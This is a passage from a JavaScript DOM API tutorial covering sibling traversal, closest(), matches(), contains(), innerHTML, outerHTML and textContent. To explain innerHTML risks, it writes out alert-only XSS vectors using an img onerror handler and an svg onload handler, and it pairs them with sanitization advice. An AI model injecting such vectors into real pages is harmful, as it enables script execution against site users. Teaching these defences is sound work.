- The element is the last/first element child of its parent
- All remaining siblings in that direction are non-element nodes

These properties were introduced in the Element Traversal Specification to provide more intuitive sibling navigation without needing to manually filter node types. They're supported in all modern browsers (IE9+).

### Practical Usage Patterns

**Iterating through element siblings:**

```javascript
let element = firstElement;
while (element) {
  // Process element
  element = element.nextElementSibling;
}
```

**Iterating through all node siblings:**

```javascript
let node = firstNode;
while (node) {
  // Process node
  node = node.nextSibling;
}
```

**Counting element siblings:**

```javascript
let count = 0;
let sibling = element.nextElementSibling;
while (sibling) {
  count++;
  sibling = sibling.nextElementSibling;
}
```

**Finding specific sibling by condition:**

```javascript
let sibling = element.nextElementSibling;
while (sibling) {
  if (sibling.classList.contains('target')) {
    break;
  }
  sibling = sibling.nextElementSibling;
}
```

### Bidirectional Navigation

These properties enable bidirectional traversal of sibling lists. Combined with `parentNode`/`parentElement`, they form the fundamental tree navigation API:

- `node.parentNode` - move up
- `node.firstChild` / `node.lastChild` - move down to first/last child
- `node.nextSibling` / `node.previousSibling` - move horizontally through all nodes
- `element.firstElementChild` / `element.lastElementChild` - move down to first/last element child
- `element.nextElementSibling` / `element.previousElementSibling` - move horizontally through elements

### Performance Characteristics

[Inference] Sibling property access is typically O(1) as browsers maintain bidirectional linked lists for DOM nodes. The properties return direct references without traversal overhead.

Iterating through all siblings is O(n) where n is the number of siblings. Element sibling iteration may skip nodes but still has O(n) complexity relative to total nodes, not just element count.

Repeatedly accessing these properties in tight loops is generally efficient, but caching results when iterating multiple times over the same sibling list can reduce redundant property access.

### Whitespace Handling Strategies

When using `nextSibling`/`previousSibling`, several strategies handle whitespace text nodes:

**Strategy 1: Use element sibling properties instead**

```javascript
// Preferred for element-only navigation
const next = element.nextElementSibling;
```

**Strategy 2: Filter by nodeType**

```javascript
let node = element.nextSibling;
while (node && node.nodeType !== 1) {
  node = node.nextSibling;
}
// node is now null or next element sibling
```

**Strategy 3: Remove whitespace from source**

```html
<div><span>First</span><span>Second</span></div>
```

**Strategy 4: Normalize whitespace**

```javascript
parent.normalize(); // Merges adjacent text nodes
```

The `normalize()` method doesn't remove whitespace-only text nodes; it only merges adjacent text nodes. For element-only traversal, `nextElementSibling`/`previousElementSibling` provide the cleanest solution.

### Relationship to childNodes and children

Sibling properties navigate the same structures accessible via parent collection properties:

`element.childNodes` is a live NodeList containing all child nodes. Sibling properties link these nodes:

- `parent.childNodes[0]` is the first child
- `parent.childNodes[0].nextSibling === parent.childNodes[1]`
- `parent.childNodes[1].previousSibling === parent.childNodes[0]`

`element.children` is a live HTMLCollection containing element children. Element sibling properties link these:

- `parent.children[0]` is the first element child
- `parent.children[0].nextElementSibling === parent.children[1]`
- `parent.children[1].previousElementSibling === parent.children[0]`

### Null Checks and Safety

Since these properties return `null` when no sibling exists, conditional checks prevent errors:

```javascript
// Safe pattern
if (element.nextElementSibling) {
  element.nextElementSibling.classList.add('highlight');
}

// Optional chaining (modern JavaScript)
element.nextElementSibling?.classList.add('highlight');

// Chain traversal
const secondNext = element.nextElementSibling?.nextElementSibling;
```

Attempting to access properties on `null` results in TypeError. Always verify sibling existence before accessing nested properties.

### Dynamic DOM Modifications

Sibling properties reflect live DOM state. Adding, removing, or rearranging nodes immediately updates sibling relationships:

```javascript
const next = element.nextElementSibling;
element.parentNode.removeChild(element);
// next.previousElementSibling may now point to different element
```

When iterating through siblings while modifying the DOM, store references carefully:

```javascript
// Unsafe: removing nodes during iteration
let node = parent.firstChild;
while (node) {
  parent.removeChild(node); // Breaks iteration
  node = node.nextSibling; // node is now null
}

// Safe: store next reference before modification
let node = parent.firstChild;
while (node) {
  const next = node.nextSibling;
  parent.removeChild(node);
  node = next;
}
```

### DocumentFragment Behavior

Nodes within a DocumentFragment have sibling relationships before insertion into the main document:

```javascript
const fragment = document.createDocumentFragment();
const div1 = document.createElement('div');
const div2 = document.createElement('div');
fragment.appendChild(div1);
fragment.appendChild(div2);

div1.nextElementSibling === div2; // true
div2.previousElementSibling === div1; // true

// After insertion
document.body.appendChild(fragment);
// Sibling relationships now relative to document.body
```

The fragment itself doesn't participate in sibling relationships—only nodes within it do until insertion.

### Shadow DOM Boundaries

Sibling properties don't cross shadow DOM boundaries. Elements inside shadow roots only see siblings within the same shadow tree:

```javascript
const host = document.createElement('div');
const shadow = host.attachShadow({mode: 'open'});
const span1 = document.createElement('span');
const span2 = document.createElement('span');
shadow.appendChild(span1);
shadow.appendChild(span2);

span1.nextElementSibling === span2; // true

// Shadow content doesn't appear as siblings to light DOM
document.body.appendChild(host);
const outsideDiv = document.createElement('div');
document.body.appendChild(outsideDiv);

host.nextElementSibling === outsideDiv; // true
// span1 and span2 remain isolated inside shadow root
```

### Slotted Content

[Inference] When using slots in shadow DOM, slotted elements maintain their sibling relationships in the light DOM tree structure. The `assignedNodes()` and `assignedElements()` methods on HTMLSlotElement provide access to slotted content, but these aren't connected via sibling properties.

### Text Node Sibling Navigation

Text nodes support `nextSibling` and `previousSibling` but not element-specific properties:

```javascript
const textNode = document.createTextNode('Hello');
textNode.nextElementSibling; // undefined (property doesn't exist)
textNode.nextSibling; // Returns next sibling node if exists
```

Only Element nodes have `nextElementSibling` and `previousElementSibling` properties. The Node interface only defines `nextSibling` and `previousSibling`.

### Comparison with Node Iterators

TreeWalker and NodeIterator provide alternative traversal mechanisms with filtering capabilities:

```javascript
const walker = document.createTreeWalker(
  parent,
  NodeFilter.SHOW_ELEMENT,
  null
);

walker.currentNode = element;
const next = walker.nextSibling(); // Similar to nextElementSibling
```

TreeWalker offers more complex filtering options but involves more overhead than direct property access. For simple sibling navigation, direct properties are more efficient.

### Common Pitfalls

**Assuming contiguous elements:** Whitespace creates unexpected text nodes between elements in formatted HTML.

**Infinite loops:** Forgetting null checks when iterating leads to infinite loops when reaching sibling list ends.

**Stale references during modification:** Removing or moving nodes invalidates sibling references cached before the modification.

**Type confusion:** Mixing node-level and element-level properties creates logic errors when non-element nodes appear unexpectedly.

**Cross-boundary expectations:** [Inference] Attempting to traverse siblings across shadow DOM boundaries or document fragments without understanding their isolation models.

### Integration with Query Methods

Sibling properties complement but differ from query methods:

```javascript
// Sibling property: O(1), returns immediate sibling only
const next = element.nextElementSibling;

// Query method: O(n), searches descendants matching selector
const next = element.querySelector('.next');

// Finding next sibling matching selector requires manual iteration
let sibling = element.nextElementSibling;
while (sibling && !sibling.matches('.target')) {
  sibling = sibling.nextElementSibling;
}
```

No built-in method directly queries siblings. Combining sibling properties with `matches()` or other tests provides selector-based sibling finding.

### Readonly Nature and Immutability

All sibling properties are readonly attributes. Assignment attempts either fail silently (in non-strict mode) or throw TypeError (in strict mode):

```javascript
'use strict';
element.nextElementSibling = otherElement; // TypeError
```

Modifying sibling relationships requires DOM manipulation methods that explicitly restructure the tree.

---

## Closest Method

### Core Functionality

The `closest()` method traverses up the DOM tree from the current element (inclusive) to the document root, returning the first ancestor element (or the element itself) that matches the specified CSS selector. If no matching ancestor exists, it returns `null`.

```javascript
const matchedElement = element.closest(selector);
```

### Traversal Direction and Scope

`closest()` performs **upward traversal only**—it checks the element itself first, then its parent, grandparent, and continues ascending through ancestors. It never searches siblings, descendants, or other branches of the DOM tree.

```javascript
<div class="container">
  <div class="wrapper">
    <button id="btn">Click</button>
  </div>
</div>

const button = document.querySelector('#btn');
button.closest('.wrapper');    // Returns the wrapper div
button.closest('.container');  // Returns the container div
button.closest('button');      // Returns the button itself
button.closest('span');        // Returns null
```

### Self-Inclusive Behavior

Unlike `parentElement` or other parent-traversal methods, `closest()` checks the element itself before checking ancestors. This behavior differs from older traversal methods:

```javascript
const div = document.querySelector('.target');

// These behave differently:
div.closest('.target');           // Returns div itself
div.parentElement.closest('.target'); // Skips div, checks only ancestors
```

### Selector Syntax Support

`closest()` accepts any valid CSS selector string, including:

- **Type selectors**: `closest('div')`
- **Class selectors**: `closest('.className')`
- **ID selectors**: `closest('#id')`
- **Attribute selectors**: `closest('[data-type="button"]')`
- **Pseudo-classes**: `closest(':not(.disabled)')`
- **Combinators**: `closest('div.container')`
- **Complex selectors**: `closest('div[data-active="true"].visible')`

Invalid selector syntax throws a `DOMException` (SyntaxError).

### Return Value Behavior

`closest()` returns exactly one of two values:

1. The first matching `Element` object (which may be the element itself)
2. `null` if no match exists in the ancestor chain

This differs from `querySelectorAll()` which returns a NodeList. Since `closest()` returns a single element or null, you must null-check before accessing properties:

```javascript
const container = element.closest('.container');
if (container) {
  container.classList.add('active');
}

// Or with optional chaining:
element.closest('.container')?.classList.add('active');
```

### Event Delegation Pattern

`closest()` is particularly useful for event delegation, where a single listener on a parent handles events from multiple children:

```javascript
document.querySelector('.list').addEventListener('click', (event) => {
  const listItem = event.target.closest('.list-item');
  
  if (listItem) {
    // Handle click on any .list-item, regardless of where exactly user clicked
    console.log('Clicked item:', listItem.dataset.id);
  }
});
```

This pattern works because `event.target` references the deepest element clicked (possibly a nested child), and `closest()` finds the relevant ancestor.

### Boundary Conditions

`closest()` stops at the document root and never searches beyond:

```javascript
document.body.closest('html');     // Returns <html> element
document.documentElement.closest('html'); // Returns <html> itself
document.documentElement.closest('body'); // Returns null (body is not ancestor of html)
```

When called on disconnected nodes (not in the document), `closest()` only searches within that disconnected subtree.

### Performance Characteristics

**[Inference]** `closest()` traversal cost scales with DOM depth—searching from a deeply nested element to the root requires checking each ancestor. However, modern browser implementations optimize selector matching, making `closest()` more efficient than manual while-loop traversal.

Selector complexity affects performance. Simple selectors (`.class`, `#id`) match faster than complex attribute selectors or pseudo-classes. **[Unverified]** Exact performance varies by browser and DOM structure.

### Comparison with Related Methods

**`closest()` vs `matches()`:**

- `matches()` checks only the element itself: `element.matches('.class')`
- `closest()` checks element and ancestors: `element.closest('.class')`

**`closest()` vs `querySelector()`:**

- `querySelector()` searches descendants (downward)
- `closest()` searches ancestors (upward)

**`closest()` vs manual parent traversal:**

```javascript
// Manual approach (old pattern):
let current = element;
while (current && !current.classList.contains('target')) {
  current = current.parentElement;
}

// Equivalent with closest():
const target = element.closest('.target');
```

The `closest()` method handles null checks, supports complex selectors, and expresses intent more clearly.

### Multiple Selector Strategy

To check for multiple possible ancestors, chain with the OR operator in the selector or use multiple calls:

```javascript
// Single call with OR:
element.closest('.modal, .dialog, .popup');

// Multiple calls for different logic:
const modal = element.closest('.modal');
const dialog = element.closest('.dialog');
if (modal) { /* ... */ }
else if (dialog) { /* ... */ }
```

### Browser Context and Document Boundaries

`closest()` respects document boundaries. In iframes, it cannot traverse beyond the iframe's document into the parent window's document:

```javascript
// Inside an iframe:
iframeElement.closest('body');  // Returns iframe's <body>, not parent's
```

Shadow DOM boundaries also stop traversal—`closest()` does not pierce shadow roots by default.

### Null Safety Patterns

Since `closest()` returns `null` for no match, destructuring or method chaining requires guards:

```javascript
// Unsafe:
element.closest('.container').classList.add('active'); // TypeError if null

// Safe patterns:
const container = element.closest('.container');
if (container) {
  container.classList.add('active');
}

// Optional chaining (ES2020+):
element.closest('.container')?.classList.add('active');

// Nullish coalescing for defaults:
const container = element.closest('.container') ?? document.body;
```

### Use Cases

**Modal/dialog detection:**

```javascript
function isInsideModal(element) {
  return element.closest('.modal') !== null;
}
```

**Form field grouping:**

```javascript
const fieldGroup = input.closest('.form-group');
const form = input.closest('form');
```

**Component boundary detection:**

```javascript
// Find which component instance this element belongs to
const component = element.closest('[data-component]');
const componentType = component?.dataset.component;
```

**Conditional behavior based on ancestor:**

```javascript
button.addEventListener('click', (e) => {
  if (e.target.closest('.disabled-section')) {
    e.preventDefault();
    return;
  }
  // Normal handling
});
```

### Error Handling

Invalid selectors throw `DOMException`:

```javascript
try {
  element.closest('::invalid-selector');
} catch (e) {
  console.error('Invalid selector:', e); // DOMException: SyntaxError
}
```

This differs from `querySelector()` which also throws on invalid syntax, but some developers expect silent failure. Always validate complex selectors or wrap in try-catch when accepting user input.

### Polyfill Considerations

`closest()` has been widely supported since 2016 (Chrome 41, Firefox 35, Safari 9), but legacy environments may need polyfills. The MDN polyfill uses `matches()` and manual traversal:

```javascript
if (!Element.prototype.closest) {
  Element.prototype.closest = function(selector) {
    let el = this;
    while (el) {
      if (el.matches(selector)) return el;
      el = el.parentElement;
    }
    return null;
  };
}
```

Modern development typically doesn't require this polyfill.

---

## matches

### Method Signature

```javascript
element.matches(selectors)
```

Returns a boolean indicating whether the element would be selected by the specified CSS selector string. Tests the element against the selector without modifying the DOM or returning any elements.

### Parameters

**selectors** (string, required): A valid CSS selector string to test against the element. Can include any valid CSS selector syntax including combinators, pseudo-classes, and attribute selectors.

### Return Value

- Returns `true` if the element matches the selector
- Returns `false` if the element does not match the selector
- Throws `SyntaxError` DOMException if the selector string is invalid

### Behavior Characteristics

#### Selector Evaluation Context

The method evaluates the selector as if it were being used in a stylesheet or `querySelector` call. The element is tested in isolation - the selector is evaluated against the element itself, not its position in the DOM tree.

#### Complex Selector Support

All CSS selector types are supported:

```javascript
// Type selectors
element.matches('div');

// Class selectors
element.matches('.active');

// ID selectors
element.matches('#header');

// Attribute selectors
element.matches('[data-id="123"]');
element.matches('[href^="https"]');

// Pseudo-classes
element.matches(':hover');
element.matches(':nth-child(2)');
element.matches(':not(.disabled)');

// Combined selectors
element.matches('div.container[data-active="true"]');
```

#### Contextual Pseudo-Classes

Some pseudo-classes depend on element position or state within the DOM:

```javascript
element.matches(':first-child');  // Evaluates based on actual position
element.matches(':last-of-type'); // Evaluates based on siblings
element.matches(':empty');        // Evaluates current content state
```

### Common Patterns

#### Event Delegation Filtering

```javascript
document.addEventListener('click', (event) => {
  if (event.target.matches('.button')) {
    handleButtonClick(event);
  }
});
```

#### Conditional Styling Logic

```javascript
const item = document.querySelector('.item');
if (item.matches('.active:not(.disabled)')) {
  // Apply specific behavior
}
```

#### Element Classification

```javascript
function isInteractive(element) {
  return element.matches('button, a, input, select, textarea, [tabindex]');
}
```

#### Traversal Filtering

```javascript
const parent = element.closest('.container');
if (parent && parent.matches('.special')) {
  // Parent has special class
}
```

### Selector Specificity and Multiple Conditions

#### Comma-Separated Selectors

```javascript
// Matches if ANY selector matches
element.matches('.active, .selected, .highlighted');
```

#### Descendant and Child Combinators

```javascript
// These test the element itself, not descendants
element.matches('div > .child');     // False unless element IS .child with div parent
element.matches('.parent .child');   // False unless element IS .child with .parent ancestor

// Context matters for these selectors
```

### Edge Cases and Gotchas

#### Pseudo-Elements Not Supported

```javascript
// Throws or returns false depending on browser
element.matches('::before');  // Not valid - pseudo-elements aren't elements
element.matches('::after');
```

#### Dynamic State Pseudo-Classes

```javascript
// These reflect current state
element.matches(':hover');    // True only if currently hovered
element.matches(':focus');    // True only if currently focused
element.matches(':checked');  // True only if currently checked
```

#### Invalid Selectors

```javascript
try {
  element.matches('div..invalid');
} catch (e) {
  // SyntaxError: Failed to execute 'matches'
}
```

#### Case Sensitivity

```javascript
// HTML elements and attributes in HTML documents are case-insensitive
element.matches('DIV');           // Same as 'div'
element.matches('[CLASS="test"]'); // Same as '[class="test"]'

// Custom attributes and values are case-sensitive
element.matches('[data-id="ABC"]'); // Different from '[data-id="abc"]'
```

### Performance Characteristics

#### Optimization Profile

`matches()` is highly optimized in modern browsers. The performance is generally O(1) to O(n) depending on selector complexity:

- Simple selectors (tag, class, ID): Very fast, O(1)
- Attribute selectors: Fast, O(1)
- Pseudo-classes requiring tree traversal (:nth-child, :first-child): O(n) where n is sibling count
- Complex combined selectors: Depends on component complexity

#### Comparison with Alternative Approaches

```javascript
// Using matches
if (element.matches('.active')) { }

// Alternative: classList
if (element.classList.contains('active')) { }  // Faster for single class

// Alternative: direct property check
if (element.className.includes('active')) { }  // Fragile, not recommended
```

For single class checks, `classList.contains()` is faster. For complex selectors, `matches()` is the only practical option.

### Browser Compatibility and Prefixes

#### Historical Prefixes

Older browsers required vendor prefixes:

```javascript
function matchesSelector(element, selector) {
  if (element.matches) {
    return element.matches(selector);
  } else if (element.matchesSelector) {
    return element.matchesSelector(selector);
  } else if (element.webkitMatchesSelector) {
    return element.webkitMatchesSelector(selector);
  } else if (element.mozMatchesSelector) {
    return element.mozMatchesSelector(selector);
  } else if (element.msMatchesSelector) {
    return element.msMatchesSelector(selector);
  }
  return false;
}
```

Modern browsers (IE9+ with prefixes, all current browsers unprefixed) support the standard `matches()` method.

### Integration Patterns

#### Event Delegation with Complex Selectors

```javascript
document.addEventListener('click', (event) => {
  const target = event.target;
  
  if (target.matches('button.submit:not(:disabled)')) {
    handleSubmit();
  } else if (target.matches('a[href^="#"]')) {
    handleHashLink(event);
  } else if (target.matches('.dropdown-item[data-value]')) {
    handleDropdownSelection(target);
  }
});
```

#### Component Boundary Detection

```javascript
function findComponentBoundary(element) {
  let current = element;
  while (current && !current.matches('[data-component]')) {
    current = current.parentElement;
  }
  return current;
}
```

#### Form Validation

```javascript
const input = document.querySelector('input');

if (input.matches(':invalid')) {
  // Show validation error
}

if (input.matches(':required:empty')) {
  // Required field is empty
}
```

### Combination with Other DOM Methods

#### With closest()

```javascript
// Find if element or ancestor matches
const container = element.closest('.container');
if (container && container.matches('.special')) {
  // Combined ancestor search and validation
}
```

#### With querySelectorAll() Filtering

```javascript
const elements = document.querySelectorAll('.item');
const filtered = Array.from(elements).filter(el => 
  el.matches(':not(.disabled)[data-visible="true"]')
);
```

#### With Event Target Matching

```javascript
element.addEventListener('click', (event) => {
  // Walk up from target to currentTarget
  let target = event.target;
  while (target !== event.currentTarget) {
    if (target.matches('.clickable-child')) {
      handleClick(target);
      break;
    }
    target = target.parentElement;
  }
});
```

### Security Considerations

#### Selector Injection

Never use unsanitized user input in selectors:

```javascript
// Vulnerable
const userClass = getUserInput();
if (element.matches(`.${userClass}`)) { }

// [Inference] An attacker could inject complex selectors or cause errors
```

#### Sanitization Approach

```javascript
function safeClassMatch(element, className) {
  // Validate className is alphanumeric
  if (!/^[a-zA-Z0-9_-]+$/.test(className)) {
    throw new Error('Invalid class name');
  }
  return element.matches(`.${className}`);
}
```

### Advanced Use Cases

#### Custom Element Detection

```javascript
function isCustomElement(element) {
  return element.matches(':not(:defined)') || 
         element.matches('[is]') ||
         element.tagName.includes('-');
}
```

#### State Machine Validation

```javascript
class StateMachine {
  canTransition(element, toState) {
    const transitions = {
      'idle': '.idle',
      'loading': '.idle:not(.error)',
      'success': '.loading',
      'error': '.loading'
    };
    
    return element.matches(transitions[toState]);
  }
}
```

#### Accessibility Checks

```javascript
function isFocusable(element) {
  return element.matches(
    'a[href], button:not([disabled]), input:not([disabled]), ' +
    'select:not([disabled]), textarea:not([disabled]), ' +
    '[tabindex]:not([tabindex="-1"])'
  );
}
```

### Polyfill Pattern

For environments without `matches()` support:

```javascript
if (!Element.prototype.matches) {
  Element.prototype.matches = 
    Element.prototype.matchesSelector ||
    Element.prototype.webkitMatchesSelector ||
    Element.prototype.mozMatchesSelector ||
    Element.prototype.msMatchesSelector ||
    function(selector) {
      const matches = (this.document || this.ownerDocument).querySelectorAll(selector);
      let i = matches.length;
      while (--i >= 0 && matches.item(i) !== this) {}
      return i > -1;
    };
}
```

### Testing and Debugging

#### Validation Testing

```javascript
// Test selector validity
function isValidSelector(selector) {
  try {
    document.createElement('div').matches(selector);
    return true;
  } catch (e) {
    return false;
  }
}
```

#### Debug Logging

```javascript
function debugMatches(element, selector) {
  const result = element.matches(selector);
  console.log(`Element matches "${selector}":`, result);
  console.log('Element:', element);
  console.log('Classes:', element.className);
  console.log('Attributes:', [...element.attributes].map(a => `${a.name}="${a.value}"`));
  return result;
}
```

---

## contains Method

### Method Signature and Return Value

```javascript
node.contains(otherNode)
```

Returns a boolean: `true` if `otherNode` is a descendant of `node` or is `node` itself, `false` otherwise.

### Self-Comparison Behavior

A node contains itself:

```javascript
const div = document.querySelector('div');
console.log(div.contains(div)); // true
```

### Descendant Detection

Checks the entire descendant tree, not just direct children:

```javascript
<div id="parent">
  <div id="child">
    <span id="grandchild">Text</span>
  </div>
</div>

const parent = document.getElementById('parent');
const grandchild = document.getElementById('grandchild');

console.log(parent.contains(grandchild)); // true (deeply nested)
```

### Null and Undefined Handling

```javascript
const element = document.querySelector('div');

console.log(element.contains(null));      // false
console.log(element.contains(undefined)); // false
```

### Non-Element Nodes

Works with all node types, including text nodes and comment nodes:

```javascript
const div = document.querySelector('div');
const textNode = div.firstChild; // Text node

console.log(div.contains(textNode)); // true

const commentNode = document.createComment('comment');
div.appendChild(commentNode);
console.log(div.contains(commentNode)); // true
```

### Detached Nodes

Returns `false` for nodes not in the same tree:

```javascript
const div1 = document.createElement('div');
const div2 = document.createElement('div');
const span = document.createElement('span');

div1.appendChild(span);

console.log(div1.contains(span)); // true
console.log(div2.contains(span)); // false (different trees)
console.log(document.body.contains(div1)); // false (not in DOM)
```

### Document and DocumentFragment

Works with `document` and `DocumentFragment` nodes:

```javascript
const element = document.querySelector('div');
console.log(document.contains(element)); // true (if in DOM)

const fragment = document.createDocumentFragment();
const span = document.createElement('span');
fragment.appendChild(span);
console.log(fragment.contains(span)); // true
```

### Performance Characteristics

**[Inference]** `contains()` performs a tree traversal operation. For deeply nested structures with many nodes, this could have performance implications if called repeatedly. **[Unverified]** The exact implementation varies by browser, but modern browsers likely optimize this with caching or tree structure metadata.

### Common Use Cases

**Event delegation validation:**

```javascript
const container = document.getElementById('container');

document.addEventListener('click', (e) => {
    if (container.contains(e.target)) {
        console.log('Clicked inside container');
    }
});
```

**Modal/dropdown close detection:**

```javascript
const dropdown = document.querySelector('.dropdown');

document.addEventListener('click', (e) => {
    if (!dropdown.contains(e.target)) {
        dropdown.classList.remove('open');
    }
});
```

**Form validation scope:**

```javascript
const form = document.querySelector('form');
const invalidFields = document.querySelectorAll('.invalid');

invalidFields.forEach(field => {
    if (form.contains(field)) {
        console.log('Invalid field found in form');
    }
});
```

**Drag and drop boundaries:**

```javascript
const dropZone = document.getElementById('drop-zone');

element.addEventListener('dragend', (e) => {
    if (dropZone.contains(e.target)) {
        console.log('Dropped inside zone');
    }
});
```

### Comparison with Alternatives

**vs compareDocumentPosition:**

```javascript
const parent = document.getElementById('parent');
const child = document.getElementById('child');

// Using contains (simpler)
parent.contains(child); // true

// Using compareDocumentPosition (more detailed)
const position = parent.compareDocumentPosition(child);
const isContained = position & Node.DOCUMENT_POSITION_CONTAINED_BY;
```

**[Inference]** `contains()` is simpler for basic containment checks; `compareDocumentPosition()` provides more detailed relationship information (preceding, following, etc.).

**vs closest:**

```javascript
const child = document.querySelector('.child');
const parent = document.querySelector('.parent');

// contains: parent perspective (does parent contain child?)
parent.contains(child); // true

// closest: child perspective (is parent an ancestor of child?)
child.closest('.parent'); // returns parent element or null
```

**vs matches:**

```javascript
const element = document.querySelector('div');

// contains: hierarchical relationship
parent.contains(element);

// matches: CSS selector match
element.matches('.some-class');
```

### Edge Cases

**Shadow DOM boundaries:**

**[Unverified]** Behavior with Shadow DOM encapsulation:

```javascript
const host = document.querySelector('.shadow-host');
const shadowRoot = host.shadowRoot;
const shadowChild = shadowRoot.querySelector('.shadow-child');

// [Inference] Regular contains cannot cross shadow boundaries
console.log(host.contains(shadowChild)); // Likely false

// Must check within shadow root
console.log(shadowRoot.contains(shadowChild)); // true
```

**Iframe boundaries:**

```javascript
const iframe = document.querySelector('iframe');
const iframeContent = iframe.contentDocument.body;

// contains does not cross iframe boundaries
console.log(document.body.contains(iframeContent)); // false
console.log(iframe.contentDocument.contains(iframeContent)); // true
```

**Node removal during check:**

**[Inference]** If a node is removed from the DOM between obtaining a reference and calling `contains()`, the result reflects the current state:

```javascript
const parent = document.querySelector('.parent');
const child = document.querySelector('.child');

const contained = parent.contains(child); // true

child.remove();

const stillContained = parent.contains(child); // false
```

### Browser Compatibility

Supported in all modern browsers and IE9+. Part of the DOM Level 4 specification.

### Type Checking

**[Inference]** Passing non-Node objects may cause errors:

```javascript
const element = document.querySelector('div');

element.contains('string'); // May throw TypeError
element.contains({}); // May throw TypeError
element.contains(123); // May throw TypeError
```

Always ensure the argument is a valid Node object when the source is uncertain.

---

# Element Properties and Attributes

## innerHTML, outerHTML, textContent, innerText

### innerHTML

#### Definition and Behavior

Returns or sets the HTML markup contained within an element. Parses the string as HTML and creates DOM nodes.

```javascript
const div = document.querySelector('div');

// Getting innerHTML
console.log(div.innerHTML);
// "<p>Hello <strong>world</strong></p>"

// Setting innerHTML
div.innerHTML = '<span>New content</span>';
// Replaces all children with new parsed HTML
```

#### Setting innerHTML: Parsing and Rendering

When setting `innerHTML`, the browser:

1. Parses the string as HTML
2. Destroys existing child nodes
3. Creates new nodes from the parsed HTML
4. Inserts them into the DOM

```javascript
const container = document.getElementById('container');

// This destroys all existing children
container.innerHTML = '<p>Paragraph 1</p><p>Paragraph 2</p>';

// Event listeners on old children are lost
const button = document.createElement('button');
button.onclick = () => console.log('clicked');
container.appendChild(button);

container.innerHTML = '<div>New content</div>';
// button and its event listener are gone
```

#### Appending vs. Replacing

```javascript
const div = document.querySelector('div');

// Replace all content
div.innerHTML = '<p>New</p>';

// Append (inefficient - reparses everything)
div.innerHTML += '<p>Appended</p>';

// Better for appending
div.insertAdjacentHTML('beforeend', '<p>Appended</p>');
```

**Performance issue with +=:**

```javascript
// Poor: Reparses entire innerHTML each iteration
for (let i = 0; i < 100; i++) {
  div.innerHTML += `<p>Item ${i}</p>`;
}

// Better: Build string first
let html = '';
for (let i = 0; i < 100; i++) {
  html += `<p>Item ${i}</p>`;
}
div.innerHTML = html;

// Best: Use DocumentFragment or insertAdjacentHTML
for (let i = 0; i < 100; i++) {
  div.insertAdjacentHTML('beforeend', `<p>Item ${i}</p>`);
}
```

#### Security Concerns: XSS Vulnerabilities

Setting `innerHTML` with unsanitized user input creates XSS vulnerabilities:

```javascript
const userInput = '<img src=x onerror="alert(\'XSS\')">';

// DANGEROUS - executes malicious code
div.innerHTML = userInput;

// Script tags don't execute when inserted via innerHTML
div.innerHTML = '<script>alert("XSS")</script>'; // Doesn't run

// But event handlers and other vectors do
div.innerHTML = '<img src=x onerror="alert(\'XSS\')">';  // Runs!
div.innerHTML = '<svg onload="alert(\'XSS\')"></svg>';  // Runs!
```

**Safe alternatives:**

```javascript
// Use textContent for text-only
div.textContent = userInput; // Safe - treats as text

// Use DOMPurify for HTML sanitization
div.innerHTML = DOMPurify.sanitize(userInput);

// Create elements programmatically
const p = document.createElement('p');
p.textContent = userInput;
div.appendChild(p);
```

#### Special Cases

**Table elements have restrictions:**

```javascript
const table = document.querySelector('table');

// This may not work as expected in older browsers
table.innerHTML = '<tr><td>Cell</td></tr>';

// Better: target tbody
table.querySelector('tbody').innerHTML = '<tr><td>Cell</td></tr>';
```

**Self-closing tags:**

```javascript
// HTML parser handles self-closing tags
div.innerHTML = '<input><br><img src="x">';
// Creates proper elements even without closing tags
```

### outerHTML

#### Definition and Behavior

Returns or sets the HTML of the element **including the element itself**.

```javascript
const div = document.querySelector('div');
div.id = 'myDiv';
div.innerHTML = '<p>Content</p>';

console.log(div.innerHTML);
// "<p>Content</p>"

console.log(div.outerHTML);
// "<div id=\"myDiv\"><p>Content</p></div>"
```

#### Setting outerHTML: Element Replacement

Setting `outerHTML` **replaces the element itself**:

```javascript
const oldDiv = document.querySelector('.old');

// Replace the entire element
oldDiv.outerHTML = '<section class="new">New content</section>';

// oldDiv is now detached from the DOM
console.log(oldDiv.parentNode); // null

// The variable still references the old element (now detached)
// This does nothing:
oldDiv.style.color = 'red';
```

**Critical gotcha:**

```javascript
const element = document.querySelector('.target');

// After this, 'element' is detached
element.outerHTML = '<div>New</div>';

// This has NO effect on the DOM!
element.classList.add('active'); // Operates on detached node

// To continue working with the new element, requery
const newElement = document.querySelector('.target');
```

#### Use Cases

```javascript
// Unwrap an element (replace element with its contents)
const wrapper = document.querySelector('.wrapper');
wrapper.outerHTML = wrapper.innerHTML;

// Replace element with different tag
const span = document.querySelector('span.important');
span.outerHTML = `<strong>${span.innerHTML}</strong>`;

// Clone and modify
const original = document.querySelector('.item');
const clone = original.cloneNode(true);
clone.id = 'new-id';
original.insertAdjacentHTML('afterend', clone.outerHTML);
```

### textContent

#### Definition and Behavior

Returns or sets the **text content** of an element and all its descendants. Ignores all HTML tags.

```javascript
const div = document.querySelector('div');
div.innerHTML = '<p>Hello <strong>world</strong></p><!-- comment -->';

console.log(div.textContent);
// "Hello world"
// (just the text, no tags, no extra whitespace)

// Setting textContent
div.textContent = '<p>Not HTML</p>';
console.log(div.innerHTML);
// "&lt;p&gt;Not HTML&lt;/p&gt;"
// (HTML entities escaped, treated as text)
```

#### Whitespace Handling

`textContent` preserves whitespace in the source:

```javascript
div.innerHTML = `
  <p>
    Line 1
    Line 2
  </p>
`;

console.log(div.textContent);
// "
//   
//     Line 1
//     Line 2
//   
// "
// (preserves all whitespace including newlines and indentation)
```

#### Setting textContent: Text Replacement

```javascript
const p = document.querySelector('p');

// Replaces all children with a single text node
p.textContent = 'New text';

// Safe for user input - no XSS risk
const userInput = '<script>alert("XSS")</script>';
p.textContent = userInput;
// Displays literally: <script>alert("XSS")</script>
```

#### Performance Characteristics

[Inference] `textContent` is generally faster than `innerHTML` for setting text-only content because it doesn't invoke the HTML parser. It directly creates a text node.

```javascript
// Faster
element.textContent = 'Plain text';

// Slower (invokes HTML parser)
element.innerHTML = 'Plain text';
```

#### Hidden Elements Inclusion

`textContent` includes text from **hidden elements**:

```javascript
div.innerHTML = `
  <p>Visible</p>
  <p style="display: none;">Hidden</p>
`;

console.log(div.textContent);
// "
//   Visible
//   Hidden
// "
// (includes text from display:none elements)
```

#### Script and Style Elements

```javascript
div.innerHTML = `
  <p>Text</p>
  <script>console.log('code');</script>
  <style>p { color: red; }</style>
`;

console.log(div.textContent);
// "
//   Text
//   console.log('code');
//   p { color: red; }
// "
// (includes script and style content)
```

### innerText

#### Definition and Behavior

